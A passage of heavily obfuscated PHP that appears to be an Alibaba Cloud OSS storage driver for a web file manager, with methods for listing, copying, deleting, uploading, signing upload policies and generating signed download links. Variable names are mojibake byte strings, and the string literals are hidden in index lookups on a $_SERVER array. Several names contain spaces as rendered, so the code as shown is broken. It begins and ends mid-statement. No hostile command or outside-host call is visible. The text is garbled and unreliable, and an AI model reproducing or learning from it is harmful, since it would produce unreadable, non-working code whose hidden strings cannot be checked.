$this->cacheMethodInfoSet($›êçæ¢->getPrefix(), !0); } if ($Ò“”µü === $Ÿçäù[12]) { break; } } $this->cacheMethodInfoSet($Éşù¿øä, !0); return array($Ÿçäù[85] => $ºÄÜãÜç, $Ÿçäù[86] => $¼îíôØ); } public function listObject($‡óïÉëÇ, $§Ë¨ÓÓå = '') { $¥×†ÅØí =& $_SERVER[‹‰”››ê]; $‡óïÉëÇ = trim($‡óïÉëÇ, $¥×†ÅØí[8]); $…û“ŠäÈ = empty($‡óïÉëÇ) && $‡óïÉëÇ !== $¥×†ÅØí[231] ? $¥×†ÅØí[12] : $‡óïÉëÇ . $¥×†ÅØí[8]; $­ØÎ¨¢ = $¥×†ÅØí[12]; $ê•æ”Ãõ = 1000; $‘ó´ÁÕ’ = $ÃÖúˆÖÔ = array(); while (!0) { check_abort(); $ÎŠ¡°üÌ = array($¥×†ÅØí[1491] => $§Ë¨ÓÓå, $¥×†ÅØí[1492] => $…û“ŠäÈ, $¥×†ÅØí[1493] => $ê•æ”Ãõ, $¥×†ÅØí[1494] => $­ØÎ¨¢); try { $øÔ¦æ“Å = $this->client->listObjects($this->bucket, $ÎŠ¡°üÌ); } catch (OSS\Core\OssException $¡ÀïÔ ”) { $this->writeLog(__FUNCTION__ . $¥×†ÅØí[215] . $¡ÀïÔ ”->getMessage()); break; } $­ØÎ¨¢ = $øÔ¦æ“Å->getNextMarker(); $ÌÎşĞØÙ = $øÔ¦æ“Å->getObjectList(); foreach ($ÌÎşĞØÙ as $Í‚·¤¼è) { if ($Í‚·¤¼è->getKey() == $…û“ŠäÈ) { continue; } $¤Ô¹¥˜ = $Í‚·¤¼è->getKey(); $›í·ƒé = $Í‚·¤¼è->getSize(); $Ø¿¼ â = $›í·ƒé == 0 && substr($¤Ô¹¥˜, strlen($¤Ô¹¥˜) - 1, 1) == $¥×†ÅØí[8] ? !0 : !1; if ($Ø¿¼ â) { continue; } $ÃÖúˆÖÔ[] = $›í·ƒé . $¥×†ÅØí[215] . $¤Ô¹¥˜; } if ($­ØÎ¨¢ === $¥×†ÅØí[12]) { break; } } return array($¥×†ÅØí[85] => $‘ó´ÁÕ’, $¥×†ÅØí[86] => $ÃÖúˆÖÔ); } public function copyFile($Íö—¡é·, $º¿‘çâŒ) { $®åøº¦ñ = $this->size($Íö—¡é·); if ($®åøº¦ñ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Íö—¡é·, $this->bucket, $this->pathEncode($º¿‘çâŒ)); } catch (OSS\Core\OssException $€µÖáÍ¶) { $this->writeLog(__FUNCTION__ . $_SERVER[‹‰”››ê][215] . $€µÖáÍ¶->getMessage()); return !1; } return $this->getPathOuter($º¿‘çâŒ); } $ø„Ãšºñ = $this->multiCopyObject($Íö—¡é·, $º¿‘çâŒ, $®åøº¦ñ); return $ø„Ãšºñ ? $this->getPathOuter($º¿‘çâŒ) : !1; } private function multiCopyObject($½ÍÀ¡ãı, $Æ¢„…õò, $•†ÓêÙÛ) { $Ì¯¿«ÑÛ =& $_SERVER[‹‰”››ê]; try { $¹ËÂ Ğ¶ = array(); if ($Ü—· = $this->hashMd5($½ÍÀ¡ãı)) { $¹ËÂ Ğ¶ = array(OSS\OssClient::OSS_HEADERS => array($Ì¯¿«ÑÛ[1498] => $Ü—·)); } $³ÈêÈò“ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Æ¢„…õò), $¹ËÂ Ğ¶); $»Ä’·°§ = 1; $ÜœÙœı = 0; $×í—óµ§ = array(); $¯ŸÎÒ¤€ = 1024 * 1024 * 10; $¸£€Û“ = $this->client->generateMultiuploadParts($•†ÓêÙÛ, $¯ŸÎÒ¤€); foreach ($¸£€Û“ as $Ô¾¦àª => $ã…¼Ûï´) { $ª×ñØƒ = $ÜœÙœı + (int) $ã…¼Ûï´[$Ì¯¿«ÑÛ[1499]]; $œ°ü–àÂ = (int) $ã…¼Ûï´[$Ì¯¿«ÑÛ[424]] + $ª×ñØƒ - 1; $ÎíãĞñí = array($Ì¯¿«ÑÛ[167] => $ª×ñØƒ, $Ì¯¿«ÑÛ[168] => $œ°ü–àÂ); $×í—óµ§[] = $this->client->uploadPartCopy($this->bucket, $½ÍÀ¡ãı, $this->bucket, $this->pathEncode($Æ¢„…õò), $»Ä’·°§, $³ÈêÈò“, $ÎíãĞñí); $»Ä’·°§ = $»Ä’·°§ + 1; } $ÍÁœœÊ = array(); foreach ($×í—óµ§ as $Ô¾¦àª => $¾†î»Ã) { $ÍÁœœÊ[] = array($Ì¯¿«ÑÛ[300] => $Ô¾¦àª + 1, $Ì¯¿«ÑÛ[301] => $¾†î»Ã); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Æ¢„…õò), $³ÈêÈò“, $ÍÁœœÊ); } catch (OSS\Core\OssException $ğŒµøéÍ) { $this->writeLog(__FUNCTION__ . $Ì¯¿«ÑÛ[215] . $ğŒµøéÍ->getMessage()); return !1; } return !0; } public function moveFile($ÔÃß¸€­, $ı±§›‹¶) { if ($this->copyFile($ÔÃß¸€­, $ı±§›‹¶)) { $this->remove($ÔÃß¸€­); return $this->getPathOuter($ı±§›‹¶); } return !1; } public function delFile($“Ùæ•À) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($“Ùæ•À)); } catch (OSS\Core\OssException $º§×¯Ş±) { $this->writeLog(__FUNCTION__ . $_SERVER[‹‰”››ê][215] . $º§×¯Ş±->getMessage()); return !1; } return !0; } public function delFolder($É‘ç•³) { $Ì†’¦¿» =& $_SERVER[‹‰”››ê]; if (!$this->exist($É‘ç•³)) { return !0; } $this->listItemCache = !1; $õÊ‡¹÷Š = $this->fileList($É‘ç•³); $this->listItemCache = !0; $’ş¤óãÔ = trim($É‘ç•³, $Ì†’¦¿»[8]) . $Ì†’¦¿»[8]; if (!empty($É‘ç•³) && $É‘ç•³ !== $Ì†’¦¿»[231] && !in_array($’ş¤óãÔ, $õÊ‡¹÷Š[$Ì†’¦¿»[85]])) { $õÊ‡¹÷Š[$Ì†’¦¿»[85]][] = $’ş¤óãÔ; } $‘¡àºÃ— = $this->delByBatch($õÊ‡¹÷Š[$Ì†’¦¿»[86]]); if (!$‘¡àºÃ—) { return !1; } $‘¡àºÃ— = $this->delByBatch($õÊ‡¹÷Š[$Ì†’¦¿»[85]]); if (!$‘¡àºÃ—) { return !1; } return $this->delFile($’ş¤óãÔ); } private function delByBatch($‹Ã´¤ëß) { foreach (array_chunk($‹Ã´¤ëß, 1000) as $¡¦¤ˆÆÈ) { try { $this->client->deleteObjects($this->bucket, $¡¦¤ˆÆÈ); } catch (OSS\Core\OssException $…“Ş…¤) { $this->writeLog(__FUNCTION__ . $_SERVER[‹‰”››ê][215] . $…“Ş…¤->getMessage()); return !1; } } return !0; } public function rename($ŞÓ‚é­æ, $ûãÒ¹€«) { return $this->renameObject($ŞÓ‚é­æ, $ûãÒ¹€«); } private function fileInfo($‡ÁÒùÍû, $¿¶ş‹‡¶ = false, $òæìŞÆ¥ = array()) { $ÄÖ¸Æ›‹ =& $_SERVER[‹‰”››ê]; $Ûîö Çç = array($ÄÖ¸Æ›‹[32] => $this->pathThis($‡ÁÒùÍû), $ÄÖ¸Æ›‹[87] => $this->getPathOuter($‡ÁÒùÍû), $ÄÖ¸Æ›‹[33] => $ÄÖ¸Æ›‹[233], $ÄÖ¸Æ›‹[79] => isset($òæìŞÆ¥[$ÄÖ¸Æ›‹[79]]) ? $òæìŞÆ¥[$ÄÖ¸Æ›‹[79]] : 0, $ÄÖ¸Æ›‹[169] => $this->ext($‡ÁÒùÍû)); if ($¿¶ş‹‡¶) { return $Ûîö Çç; } $Ûîö Çç[$ÄÖ¸Æ›‹[234]] = $Ûîö Çç[$ÄÖ¸Æ›‹[88]] = 0; $Ûîö Çç[$ÄÖ¸Æ›‹[235]] = $Ûîö Çç[$ÄÖ¸Æ›‹[236]] = !0; if (empty($òæìŞÆ¥)) { $Ñ¨‘¼Í = $this->objectMeta($‡ÁÒùÍû); if (!$Ñ¨‘¼Í) { return $Ûîö Çç; } $òæìŞÆ¥ = array($ÄÖ¸Æ›‹[88] => strtotime($Ñ¨‘¼Í[$ÄÖ¸Æ›‹[1497]]), $ÄÖ¸Æ›‹[79] => $Ñ¨‘¼Í[$ÄÖ¸Æ›‹[1496]] + 0, $ÄÖ¸Æ›‹[1495] => $Ñ¨‘¼Í[$ÄÖ¸Æ›‹[1495]]); } if (isset($òæìŞÆ¥[$ÄÖ¸Æ›‹[1495]]) && $òæìŞÆ¥[$ÄÖ¸Æ›‹[1495]]) { $Ûîö Çç[$ÄÖ¸Æ›‹[238]] = trim($òæìŞÆ¥[$ÄÖ¸Æ›‹[1495]], $ÄÖ¸Æ›‹[121]); } if (isset($òæìŞÆ¥[$ÄÖ¸Æ›‹[79]])) { $Ûîö Çç[$ÄÖ¸Æ›‹[79]] = $òæìŞÆ¥[$ÄÖ¸Æ›‹[79]]; } if (isset($òæìŞÆ¥[$ÄÖ¸Æ›‹[88]])) { $Ûîö Çç[$ÄÖ¸Æ›‹[88]] = $òæìŞÆ¥[$ÄÖ¸Æ›‹[88]]; } if (isset($òæìŞÆ¥[$ÄÖ¸Æ›‹[207]]) && !trim($Ûîö Çç[$ÄÖ¸Æ›‹[88]])) { $Ûîö Çç[$ÄÖ¸Æ›‹[88]] = $òæìŞÆ¥[$ÄÖ¸Æ›‹[207]]; } return $Ûîö Çç; } private function folderInfo($Ê÷Çø‡¤, $üóÅ©Ëß = false, $³Ä‘ú¨¸ = array()) { $à¾ôô„ =& $_SERVER[‹‰”››ê]; $÷å°ìó¿ = array($à¾ôô„[32] => $this->pathThis($Ê÷Çø‡¤), $à¾ôô„[87] => $this->getPathOuter($à¾ôô„[8] . $Ê÷Çø‡¤), $à¾ôô„[33] => $à¾ôô„[78]); if ($üóÅ©Ëß) { return $÷å°ìó¿; } $÷å°ìó¿[$à¾ôô„[234]] = $÷å°ìó¿[$à¾ôô„[88]] = 0; $÷å°ìó¿[$à¾ôô„[235]] = $÷å°ìó¿[$à¾ôô„[236]] = !0; if (empty($³Ä‘ú¨¸)) { $Ê÷Çø‡¤ = rtrim($Ê÷Çø‡¤, $à¾ôô„[8]) . $à¾ôô„[8]; $”ò”ãÉÙ = $this->objectMeta($Ê÷Çø‡¤); if (!$”ò”ãÉÙ) { return $÷å°ìó¿; } $³Ä‘ú¨¸ = array($à¾ôô„[234] => $”ò”ãÉÙ[$à¾ôô„[589]][$à¾ôô„[1500]], $à¾ôô„[88] => strtotime($”ò”ãÉÙ[$à¾ôô„[1497]])); } if (isset($³Ä‘ú¨¸[$à¾ôô„[88]])) { $÷å°ìó¿[$à¾ôô„[88]] = $³Ä‘ú¨¸[$à¾ôô„[88]]; } if (isset($³Ä‘ú¨¸[$à¾ôô„[234]])) { $÷å°ìó¿[$à¾ôô„[234]] = $³Ä‘ú¨¸[$à¾ôô„[234]]; } return $÷å°ìó¿; } public function listPath($ä„À¶ãÇ, $¹É¦Üƒú = false) { $Ã×¼ùÒº =& $_SERVER[‹‰”››ê]; $±«¨Ç›£ = $this->fileList($ä„À¶ãÇ, $Ã×¼ùÒº[8], !0); foreach ($±«¨Ç›£[$Ã×¼ùÒº[85]] as $Å¹ãé¹Í => $œˆâÉ›) { $±«¨Ç›£[$Ã×¼ùÒº[85]][$Å¹ãé¹Í] = $this->folderInfo($œˆâÉ›, $¹É¦Üƒú, $œˆâÉ›); } foreach ($±«¨Ç›£[$Ã×¼ùÒº[86]] as $Å¹ãé¹Í => $œˆâÉ›) { $±«¨Ç›£[$Ã×¼ùÒº[86]][$Å¹ãé¹Í] = $this->fileInfo($œˆâÉ›[$Ã×¼ùÒº[32]], $¹É¦Üƒú, $œˆâÉ›); } return $±«¨Ç›£; } protected function infoChildren($Î¬à×ß¿, &$¾Éöæ…) { $·—ë·“¸ =& $_SERVER[‹‰”››ê]; $»–Ò‡ü‚ = $this->fileList($Î¬à×ß¿, $·—ë·“¸[12], !0); $¾Éöæ…[$·—ë·“¸[81]] += count($»–Ò‡ü‚[$·—ë·“¸[85]]); $¾Éöæ…[$·—ë·“¸[80]] += count($»–Ò‡ü‚[$·—ë·“¸[86]]); foreach ($»–Ò‡ü‚[$·—ë·“¸[86]] as $ËÜş¨óş) { if (!$ËÜş¨óş || !$ËÜş¨óş[$·—ë·“¸[79]]) { continue; } $¾Éöæ…[$·—ë·“¸[79]] += $ËÜş¨óş[$·—ë·“¸[79]]; } } public function has($å“şÊó, $ùÈ‹‡‡ = false, $ÓŞ„ã = true) { $­…Á“¡ =& $_SERVER[‹‰”››ê]; $å“şÊó = trim($å“şÊó, $­…Á“¡[8]); $õ‘­ÄÍ = empty($å“şÊó) && $å“şÊó !== $­…Á“¡[231] ? $­…Á“¡[12] : $å“şÊó . $­…Á“¡[8]; $Ç§Ÿİ·õ = $­…Á“¡[12]; $ú£ÓÀ· = 500; $Ë€ü€àı = $±½ÆèÜç = 0; while (!0) { check_abort(); $¤ëîá³Ë = array($­…Á“¡[1491] => $­…Á“¡[8], $­…Á“¡[1492] => $õ‘­ÄÍ, $­…Á“¡[1493] => $ú£ÓÀ·, $­…Á“¡[1494] => $Ç§Ÿİ·õ); try { $Ú”ïô¡ = $this->client->listObjects($this->bucket, $¤ëîá³Ë); } catch (OSS\Core\OssException $Òñé¾­à) { $this->writeLog(__FUNCTION__ . $­…Á“¡[215] . $Òñé¾­à->getMessage()); break; } $Ç§Ÿİ·õ = $Ú”ïô¡->getNextMarker(); $ÎÔ¾É = $Ú”ïô¡->getObjectList(); $öœìş” = $Ú”ïô¡->getPrefixList(); if ($ùÈ‹‡‡) { if (count($ÎÔ¾É) > 1 || count($ÎÔ¾É) == 1 && $ÎÔ¾É[0]->getKey() != $õ‘­ÄÍ) { $Ë€ü€àı += count($ÎÔ¾É) - 1; } if (!empty($öœìş”)) { $±½ÆèÜç += count($öœìş”); } if ($Ç§Ÿİ·õ === $­…Á“¡[12]) { break; } continue; } if ($ÓŞ„ã) { if (!empty($ÎÔ¾É)) { if (count($ÎÔ¾É) > 1 || $ÎÔ¾É[0]->getKey() != $õ‘­ÄÍ) { return !0; } } } else { if (!empty($öœìş”)) { return !0; } } if ($Ç§Ÿİ·õ === $­…Á“¡[12]) { break; } } if ($ùÈ‹‡‡) { return array($­…Á“¡[242] => $Ë€ü€àı, $­…Á“¡[243] => $±½ÆèÜç); } return !1; } public function listAll($«È¬æµŒ) { $ˆøÙÌë =& $_SERVER[‹‰”››ê]; $†ï—è¡ä = $this->fileList($«È¬æµŒ, $ˆøÙÌë[12], !0); $‡Õß´ø = array_to_keyvalue($†ï—è¡ä[$ˆøÙÌë[86]], $ˆøÙÌë[32]); foreach ($†ï—è¡ä[$ˆøÙÌë[85]] as $ŠÕÄœ¯õ) { if (is_string($ŠÕÄœ¯õ)) { $‡Õß´ø[$ŠÕÄœ¯õ] = array($ˆøÙÌë[79] => 0); } } return $this->listAllFiles($«È¬æµŒ, $‡Õß´ø); } public function canRead($üÏÜÇõµ) { $‚Ê€ÖÆŞ =& $_SERVER[‹‰”››ê]; $ŞììÃÌÍ = $this->pathAcl($üÏÜÇõµ); return $ŞììÃÌÍ == $‚Ê€ÖÆŞ[1501] || $ŞììÃÌÍ == $‚Ê€ÖÆŞ[636] ? !0 : !1; } public function canWrite($åœÃÉÃ‡) { $‚„œ‹Úè = $this->pathAcl($åœÃÉÃ‡); return $‚„œ‹Úè == $_SERVER[‹‰”››ê][636] ? !0 : !1; } public function pathAcl($‰…ÌˆÀ©) { $ß–Ñ»¬ =& $_SERVER[‹‰”››ê]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $©…ÉÔ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($‰…ÌˆÀ©)); } catch (OSS\Core\OssException $ÓÓ²°Ü») { $this->writeLog(__FUNCTION__ . $ß–Ñ»¬[215] . $ÓÓ²°Ü»->getMessage()); return !1; } $›ïÜİ = $©…ÉÔ == $ß–Ñ»¬[37] ? $this->bucketAcl : $©…ÉÔ; if ($›ïÜİ == $ß–Ñ»¬[1502]) { return $ß–Ñ»¬[1501]; } if ($›ïÜİ == $ß–Ñ»¬[1503]) { return $ß–Ñ»¬[636]; } return $›ïÜİ; } private function chmodPath($ù¡Ò·óî, $šºÓ…¸ = '') { $Ûâşö“ú =& $_SERVER[‹‰”››ê]; $â‡Â•’á = empty($šºÓ…¸) ? $Ûâşö“ú[1503] : $šºÓ…¸; $˜•˜„ù” = array($Ûâşö“ú[37], $Ûâşö“ú[232], $Ûâşö“ú[1502], $Ûâşö“ú[1503]); if (!in_array($â‡Â•’á, $˜•˜„ù”)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ù¡Ò·óî), $â‡Â•’á); } catch (OSS\Core\OssException $‰×Æ‰¾ó) { $this->writeLog(__FUNCTION__ . $Ûâşö“ú[215] . $‰×Æ‰¾ó->getMessage()); return !1; } return !0; } public function getContent($‚™®®Çê) { return $this->fileSubstr($‚™®®Çê, -1); } public function setContent($¾ëĞÌæÈ, $“€ªãŠ£ = '') { $¬©­ºµû =& $_SERVER[‹‰”››ê]; try { $õõÕ®Ñ™ = $this->trafficLimit($¬©­ºµû[1504]); $À³¸÷¤î = $this->client->putObject($this->bucket, $this->pathEncode($¾ëĞÌæÈ), $“€ªãŠ£, $õõÕ®Ñ™); } catch (OSS\Core\OssException $º¹ÃŸ) { $this->writeLog(__FUNCTION__ . $¬©­ºµû[215] . $º¹ÃŸ->getMessage()); return !1; } $Æ¨çñ” = array($¬©­ºµû[1498] => trim($À³¸÷¤î[$¬©­ºµû[1495]], $¬©­ºµû[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¾ëĞÌæÈ))); $this->updateObjMeta($¾ëĞÌæÈ, $Æ¨çñ”); return isset($À³¸÷¤î[$¬©­ºµû[1505]][$¬©­ºµû[297]]) ? !0 : !1; } private function updateObjMeta($•ò‘Æ—Û, $°®ŒÂÓÜ) { $•ò‘Æ—Û = $this->pathEncode($•ò‘Æ—Û); try { $‚ÓÑ‘©ö = array(OSS\OssClient::OSS_HEADERS => $°®ŒÂÓÜ); $this->client->copyObject($this->bucket, $•ò‘Æ—Û, $this->bucket, $•ò‘Æ—Û, $‚ÓÑ‘©ö); } catch (OSS\Core\OssException $¿µœ’îÇ) { $this->writeLog(__FUNCTION__ . $_SERVER[‹‰”››ê][215] . $¿µœ’îÇ->getMessage()); return !1; } return !0; } public function upload($êÌñØæÙ, $íÀ×äÄÚ, $ ÎÑæ­¡ = false, $ÒÍê£Œã = REPEAT_REPLACE) { $ø·ãï”¦ =& $_SERVER[‹‰”››ê]; $¨ûìõ¼Ğ = trim($êÌñØæÙ, $ø·ãï”¦[8]); $Õ¾Øºí = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ø·ãï”¦[1498] => @md5_file($íÀ×äÄÚ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($êÌñØæÙ))); $Õ¾Øºí = $this->trafficLimit($ø·ãï”¦[1504], $Õ¾Øºí); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($¨ûìõ¼Ğ), $íÀ×äÄÚ, $Õ¾Øºí); } catch (OSS\Core\OssException $ÇÄş“À) { $this->writeLog(__FUNCTION__ . $ø·ãï”¦[215] . $ÇÄş“À->getMessage()); return !1; } return $this->getPathOuter($êÌñØæÙ); } public function getHost() { $¨©™çÈç =& $_SERVER[‹‰”››ê]; $À‘¿‘¹À = explode($¨©™çÈç[211], parent::getHost()); return $À‘¿‘¹À[0] . $¨©™çÈç[211] . $this->bucket . $¨©™çÈç[10] . $À‘¿‘¹À[1]; } public function uploadFormData($êô‚î¦ã, $Èİƒ»¡Ş = 3600) { $¼òÍĞ°¬ =& $_SERVER[‹‰”››ê]; if (!($­‘Îâ‡ù = $this->getHost())) { return !1; } $Â¬£ÖîĞ = $Èİƒ»¡Ş; $š—ÍĞ¬‡ = date($¼òÍĞ°¬[1506], time() + $Â¬£ÖîĞ); $ ”‘†îÁ = new DateTime($š—ÍĞ¬‡); $ŠøßªÃñ = $ ”‘†îÁ->format(DateTime::ISO8601); $«ü­ıı = strpos($ŠøßªÃñ, $¼òÍĞ°¬[383]); $ŠøßªÃñ = substr($ŠøßªÃñ, 0, $«ü­ıı) . $¼òÍĞ°¬[1507]; $«û­¡ÒŠ = 1048576000 * 5; $¿ö»ÒõŠ = $this->pathFather($êô‚î¦ã); $–ÂÚÑÃÜ = array($¼òÍĞ°¬[265] => $ŠøßªÃñ, $¼òÍĞ°¬[268] => array(array($¼òÍĞ°¬[1508], 0, $«û­¡ÒŠ), array($¼òÍĞ°¬[270], $¼òÍĞ°¬[271], $¿ö»ÒõŠ))); $ÌìÜ«¹Ã = base64_encode(json_encode($–ÂÚÑÃÜ)); $ÕÄ„²ãè = base64_encode(hash_hmac($¼òÍĞ°¬[1428], $ÌìÜ«¹Ã, $this->secret, !0)); $†ŒÌèŠ¿ = array($¼òÍĞ°¬[1509] => $this->accessKey, $¼òÍĞ°¬[280] => $ÌìÜ«¹Ã, $¼òÍĞ°¬[273] => $¼òÍĞ°¬[264], $¼òÍĞ°¬[1510] => $ÕÄ„²ãè, $¼òÍĞ°¬[209] => $­‘Îâ‡ù); $†ŒÌèŠ¿ = $this->trafficLimit($¼òÍĞ°¬[1504], $†ŒÌèŠ¿, !0); return $†ŒÌèŠ¿; } public function uploadMultiData($ŸÍ˜²Ë—, $îØ‹ù­ø = 3600) { $®¬Ïãëç =& $_SERVER[‹‰”››ê]; if (!($ƒ˜¤êè = $this->getHost())) { return !1; } $²ğëÀœ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ŸÍ˜²Ë—)); return array($®¬Ïãëç[284] => $²ğëÀœ, $®¬Ïãëç[209] => $ƒ˜¤êè . $®¬Ïãëç[8] . $this->pathEncode($ŸÍ˜²Ë—), $®¬Ïãëç[285] => gmdate($®¬Ïãëç[1511]), $®¬Ïãëç[97] => $ŸÍ˜²Ë—); } public function uploadMultiAuth($Ø®ş­ğ, $×½ÔÖ£Å = array()) { if (isset($×½ÔÖ£Å[$_SERVER[‹‰”››ê][286]])) { return $this->uploadPartAuth($Ø®ş­ğ, $×½ÔÖ£Å); } return $this->uploadListAuth($Ø®ş­ğ, $×½ÔÖ£Å); } private function uploadPartAuth($—ºšüØ, $”™şºÜí = array()) { $ïĞûÃş =& $_SERVER[‹‰”››ê]; $ÖÇë”µ¡ = $”™şºÜí[$ïĞûÃş[97]]; $¦“Í¹À = $this->_getUploadAuth($ÖÇë”µ¡, $”™şºÜí); $Ê¿­‘€¤ = array($ïĞûÃş[289] => $¦“Í¹À[$ïĞûÃş[289]], $ïĞûÃş[285] => $¦“Í¹À[$ïĞûÃş[285]]); if (isset($¦“Í¹À[$ïĞûÃş[1512]])) { $Ê¿­‘€¤[$ïĞûÃş[1512]] = $¦“Í¹À[$ïĞûÃş[1512]]; } return $Ê¿­‘€¤; } private function uploadListAuth($ğÕ±¾Õ’, $Àôù•€à = array()) { $ÚïÜ¹ü =& $_SERVER[‹‰”››ê]; $ÌÈèòãÎ = $Àôù•€à[$ÚïÜ¹ü[97]]; $•«ŒŒöş = $Àôù•€à[$ÚïÜ¹ü[284]]; $¼á‰ó–À = $this->client->listParts($this->bucket, $this->pathEncode($ÌÈèòãÎ), $•«ŒŒöş); $Ù²Şœš = $¼á‰ó–À->getListPart(); $êÍÒ²ê½ = array(); foreach ($Ù²Şœš as $ûèİŒ÷Û) { $êÍÒ²ê½[] = array($ÚïÜ¹ü[300] => $ûèİŒ÷Û->getPartNumber(), $ÚïÜ¹ü[301] => trim($ûèİŒ÷Û->getETag(), $ÚïÜ¹ü[121])); } if (!$êÍÒ²ê½) { return !1; } $Äöñ¤Ÿ = $this->_getUploadAuth($ÌÈèòãÎ, $Àôù•€à); return array($ÚïÜ¹ü[289] => $Äöñ¤Ÿ[$ÚïÜ¹ü[289]], $ÚïÜ¹ü[285] => $Äöñ¤Ÿ[$ÚïÜ¹ü[285]], $ÚïÜ¹ü[292] => $êÍÒ²ê½); } private function _getUploadAuth($š°„‘«, $ÀÅĞå©Ú) { $±ûÜÕÇ× =& $_SERVER[‹‰”››ê]; $°ÓÎóø = gmdate($±ûÜÕÇ×[1511]); $‘ĞÏªº = isset($ÀÅĞå©Ú[$±ûÜÕÇ×[286]]) ? $±ûÜÕÇ×[256] : $±ûÜÕÇ×[291]; $©©İª¡ = array_intersect_key($ÀÅĞå©Ú, array_flip(array($±ûÜÕÇ×[286], $±ûÜÕÇ×[284]))); ksort($©©İª¡); $êºÈ¢Ò° = $©©İª¡ ? $±ûÜÕÇ×[76] . http_build_query($©©İª¡, null, $±ûÜÕÇ×[287], PHP_QUERY_RFC3986) : $±ûÜÕÇ×[12]; $””ÏŒî’ = array($‘ĞÏªº, $±ûÜÕÇ×[12], $±ûÜÕÇ×[123], $°ÓÎóø, "\x78\x2d\157\x73\x73\x2d\x64\x61\164\x65\72{$°ÓÎóø}", $±ûÜÕÇ×[8] . $this->bucket . $±ûÜÕÇ×[8] . $š°„‘« . $êºÈ¢Ò°); if (isset($ÀÅĞå©Ú[$±ûÜÕÇ×[286]])) { $¨«˜í…¢ = $this->trafficLimit($±ûÜÕÇ×[1504], array(), !0); if ($¨«˜í…¢) { $š°„‘« = $±ûÜÕÇ×[1512]; array_splice($””ÏŒî’, 5, 0, $š°„‘« . $±ûÜÕÇ×[4] . $¨«˜í…¢[$š°„‘«]); } } $™áĞÅ¤’ = implode($±ûÜÕÇ×[288], $””ÏŒî’); $ù£ÇŸ©Â = base64_encode(hash_hmac($±ûÜÕÇ×[1428], $™áĞÅ¤’, $this->secret, !0)); $«©Ş¿°œ = $±ûÜÕÇ×[1481] . $this->accessKey . $±ûÜÕÇ×[4] . $ù£ÇŸ©Â; $¯–„ú¤Ç = array($±ûÜÕÇ×[289] => $«©Ş¿°œ, $±ûÜÕÇ×[285] => $°ÓÎóø); if (!empty($¨«˜í…¢)) { $¯–„ú¤Ç = array_merge($¯–„ú¤Ç, $¨«˜í…¢); } return $¯–„ú¤Ç; } public function download($ÇÄ£À¾Ö, $ì·ö–ªã) { $“Ù­š²ß =& $_SERVER[‹‰”››ê]; if ($this->isFolder($ÇÄ£À¾Ö)) { return !1; } try { $ÈÇ—Ø»§ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ì·ö–ªã); $ÈÇ—Ø»§ = $this->trafficLimit($“Ù­š²ß[112], $ÈÇ—Ø»§); $this->client->getObject($this->bucket, $this->pathEncode($ÇÄ£À¾Ö), $ÈÇ—Ø»§); } catch (OSS\Core\OssException $–õÅÑ‚ş) { $this->writeLog(__FUNCTION__ . $“Ù­š²ß[215] . $–õÅÑ‚ş->getMessage()); return !1; } return $ì·ö–ªã; } public function fileSubstr($ñÕôÉ´–, $ä¯óœ­Ê = 0, $ĞÙ”¢©¤ = false) { if ($ä¯óœ­Ê === -1) { $ÑĞ£ÉÒİ = array(); } else { if ($ĞÙ”¢©¤ === !1) { $è‰ïÜø— = $this->size($ñÕôÉ´–); } else { $è‰ïÜø— = $ä¯óœ­Ê + $ĞÙ”¢©¤ - 1; } $ÑĞ£ÉÒİ = array(OSS\OssClient::OSS_RANGE => "{$ä¯óœ­Ê}\x2d{$è‰ïÜø—}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ñÕôÉ´–), $ÑĞ£ÉÒİ); } catch (OSS\Core\OssException $÷“Ãƒã) { $this->writeLog(__FUNCTION__ . $_SERVER[‹‰”››ê][215] . $÷“Ãƒã->getMessage()); think_exception($÷“Ãƒã->getMessage()); return !1; } } private function trafficLimit($×ªõˆÚÃ, $¬Åû™§„ = array(), $ìŠº‘Š˜ = false) { $ÎˆÎïè¥ =& $_SERVER[‹‰”››ê]; if ($×ªõˆÚÃ == $ÎˆÎïè¥[1504] && $this->isUploadServer() || $×ªõˆÚÃ == $ÎˆÎïè¥[112] && $this->isFileOutServer()) { return $¬Åû™§„; } $şİ­Éß = floatval($GLOBALS[$ÎˆÎïè¥[6]][$ÎˆÎïè¥[92]][$ÎˆÎïè¥[110]][$×ªõˆÚÃ]) * 1024 * 1024 * 8; if (!$şİ­Éß) { return $¬Åû™§„; } $şİ­Éß = $şİ­Éß < 819200 ? 819200 : ($şİ­Éß > 838860800 ? 838860800 : $şİ­Éß); if ($ìŠº‘Š˜) { $¬Åû™§„[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($şİ­Éß); } else { if (!isset($¬Åû™§„[OSS\OssClient::OSS_HEADERS])) { $¬Åû™§„[OSS\OssClient::OSS_HEADERS] = array(); } $¬Åû™§„[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($şİ­Éß); } return $¬Åû™§„; } public function link($ççõ×Ëø, $ÇÉ’Ò¾ = array()) { $ô–ñÕŒ =& $_SERVER[‹‰”››ê]; if (!$this->exist($ççõ×Ëø) || $this->isFolder($ççõ×Ëø)) { return !1; } try { $ÇÉ’Ò¾ = $this->trafficLimit($ô–ñÕŒ[112], $ÇÉ’Ò¾, !0); $”±‡‡„© = $this->client->signUrl($this->bucket, $this->pathEncode($ççõ×Ëø), 3600 * 12, $ô–ñÕŒ[1513], $ÇÉ’Ò¾); return $this->getCdnLink($”±‡‡„©); } catch (OSS\Core\OssException $‡àÃíÀ) { $this->writeLog(__FUNCTION__ . $ô–ñÕŒ[215] . $‡àÃíÀ->getMessage()); return !1; } } public function fileOut($¿Õ“ÏÀ®, $Ô‹“¢° = false, $êÂÊšœ¼ = false, 